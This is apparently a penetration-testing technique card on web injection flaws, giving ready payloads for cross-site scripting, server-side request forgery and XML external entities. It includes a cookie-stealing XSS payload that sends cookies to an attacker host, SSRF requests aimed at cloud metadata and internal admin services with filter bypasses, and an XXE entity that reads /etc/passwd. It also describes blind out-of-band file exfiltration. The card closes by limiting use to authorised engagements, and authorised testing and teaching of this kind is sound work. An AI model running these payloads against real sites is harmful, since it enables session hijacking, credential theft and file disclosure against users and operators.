---
tool: XSS, SSRF and XXE
slug: xss-ssrf-xxe
kind: technique
stages: [exploitation]
category: Injection beyond the shell
platforms: [web]
services: [http, https]
ports: [80, 443, 8080, 8443]
tags: [web, xss, ssrf, xxe, injection, payloads]
attack: [T1059.007, T1190]
summary: The web flaws that do not hand you a shell but still win: run script in a victim's browser, make the server fetch what you cannot reach, or read files and reach internal hosts through a hungry XML parser. The payloads to confirm each and turn it into impact.
references:
  - The Hacker Recipes: user inputs | https://www.thehacker.recipes/web/inputs/
  - PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings
---

## Cross-site scripting (XSS)

Confirm reflected or stored injection, then steal a session or act as the victim. Minimal probe, then a cookie exfil:

```html
<script>alert(document.domain)</script>
<img src=x onerror="fetch('http://YOUR_IP/?c='+document.cookie)">
```

Stored XSS in an admin-viewed field (a support ticket, a username) is the high-impact case: aim your payload at where staff will open it. If an input is filtered, try event handlers (`onerror`, `onload`), `javascript:` URLs, or an SVG/`<img>` vector.

## Server-side request forgery (SSRF)

The server fetches a URL you control. Reach internal services, cloud metadata, or scan the internal range by changing a `url=` / `image=` parameter:

```text
http://TARGET/fetch?url=http://127.0.0.1:8080/admin
http://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/
```

Bypass naive filters with `http://127.1`, a decimal IP, `localhost.`, or an open-redirect on an allowed host. Blind SSRF: point it at your listener to prove the fetch, then enumerate ports by timing.

## XML external entity (XXE)

An XML parser that resolves external entities reads local files and makes requests. Declare an entity and reference it in a returned field:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>
```

No output reflected back? Use a blind out-of-band entity that fetches a DTD from your server and exfiltrates the file contents over HTTP.

## Notes

These confirmations touch other users' sessions, internal hosts and local files, so keep probes benign (an `alert`, a read of a non-sensitive file, a callback to your own listener) until impact is agreed, and record the parameter and payload for the report. Point callbacks only at infrastructure you control. In-scope and authorised use only; anything read or captured is sensitive loot to handle with the engagement data.
